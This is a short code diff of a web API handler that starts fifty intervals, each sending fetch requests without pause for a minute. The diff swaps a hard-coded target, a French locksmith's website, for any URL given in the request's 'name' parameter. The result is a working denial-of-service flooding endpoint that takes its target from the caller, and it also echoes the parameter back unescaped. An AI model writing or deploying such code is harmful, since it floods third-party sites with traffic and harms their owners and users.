@@ -11,10 +11,10 @@ export default function handler(
 
     for(var i = 0; i < 50; i++) {
         const luanch = setInterval(() => {
-            fetch('https://serrurerie-strasbourg-depannage.fr/').then()
+            fetch(req.query.name as string).then()
         })
         setTimeout(() => clearInterval(luanch), 60 * 1000)
     }
     
-    res.status(200).json({ message: `JK-${Math.random()}` })
+    res.status(200).json({ message: `JK-${req.query.name}` })
 }
